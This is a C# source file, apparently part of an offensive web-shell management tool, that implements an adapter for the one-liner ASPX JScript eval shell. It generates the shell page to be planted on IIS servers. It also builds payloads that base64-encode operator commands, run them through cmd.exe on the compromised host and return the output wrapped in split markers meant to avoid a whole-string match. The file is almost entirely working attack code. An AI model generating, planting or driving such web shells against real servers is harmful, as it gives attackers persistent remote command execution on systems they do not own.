using System.Text;

namespace Rod.Transport.WebShells;

/// <summary>
/// The universal one-liner ASPX family: the placed page is the classic
/// JScript.NET eval line (<c>&lt;%@ Page Language="Jscript"%&gt;&lt;%eval(
/// Request.Item[...],"unsafe");%&gt;</c>) -- the shape every web-shell
/// manager drives on IIS, which is why a page placed by hand or by another
/// tool answers this client too. Each request's value is the JScript
/// wrapper itself (the eval consumes it directly): the command rides
/// base64-encoded inside it through the standard process builder with both
/// output streams captured, and the wrapper frames its answer with the
/// family's marker halves around a base64-encoded body.
///
/// ASPX rides IIS, so the wrapper runs the command through the platform's
/// own shell. No function-fallback chains and no bypass logic: those belong
/// to out-of-tree tradecraft (architecture.md Sec 13).
/// </summary>
public sealed class EvalAspxAdapter : EvalWebShellAdapterBase
{
    public override string Id => "eval-aspx";
    public override string ScriptLanguage => "aspx";

    protected override (string Prefix, string Suffix) PasswordLiteral => ("Request.Item[\"", "\"]");

    public override string RenderScript(string password)
        => "<%@ Page Language=\"Jscript\"%><%eval(Request.Item[\"" + password + "\"],\"unsafe\");%>";

    public override WebShellRequest EncodeCommand(
        string url,
        string password,
        string encoder,
        string decoder,
        string command)
    {
        if (encoder != "base64")
            throw new NotSupportedException($"The {Id} adapter implements the base64 encoder, not '{encoder}'.");
        if (decoder is not ("base64" or "default"))
            throw new NotSupportedException($"The {Id} adapter implements the base64 and default decoders, not '{decoder}'.");

        var tagStart = WebShellAdapters.RandomToken(6, 12);
        var tagEnd = WebShellAdapters.RandomToken(6, 12);
        var commandEncoded = Convert.ToBase64String(Encoding.UTF8.GetBytes(command));

        // The wrapper's own text: the command rides base64-encoded inside
        // it, so no quoting of the operator's text ever touches the
        // JScript string, and the markers ride as concatenated halves so
        // the wrapper never contains either whole.
        var wrapper =
            "var c=System.Text.Encoding.UTF8.GetString(System.Convert.FromBase64String('" + commandEncoded + "'));"
            + "var pi=new System.Diagnostics.ProcessStartInfo('cmd.exe','/c '+c);"
            + "pi.UseShellExecute=false;pi.RedirectStandardOutput=true;pi.RedirectStandardError=true;"
            + "var p=System.Diagnostics.Process.Start(pi);"
            + "var o=p.StandardOutput.ReadToEnd()+p.StandardError.ReadToEnd();"
            + "p.WaitForExit();"
            + "Response.Write('" + Half(tagStart) + "'+'" + HalfBack(tagStart) + "'"
            + "+System.Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(o))"
            + "+'" + Half(tagEnd) + "'+'" + HalfBack(tagEnd) + "');"
            + "Response.End();";

        var form = new Dictionary<string, string>
        {
            [password] = wrapper,
        };
        return new WebShellRequest(url, form, tagStart, tagEnd, password);
    }
}
